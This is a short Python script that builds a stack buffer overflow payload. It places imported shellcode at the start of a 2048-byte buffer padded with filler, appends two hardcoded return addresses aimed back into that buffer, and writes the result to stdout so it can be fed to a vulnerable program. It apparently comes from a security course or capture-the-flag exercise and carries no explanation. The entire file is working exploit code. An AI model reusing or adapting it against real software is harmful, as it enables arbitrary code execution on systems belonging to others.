from shellcode import shellcode
import sys
if __name__ == '__main__':
    attack = shellcode
    attack += b"a" * (2048-len(shellcode))
    attack += 0xfff68Ab8.to_bytes(4, "little")
    attack += 0xFFF692cc.to_bytes(4, "little")
    sys.stdout.buffer.write(attack)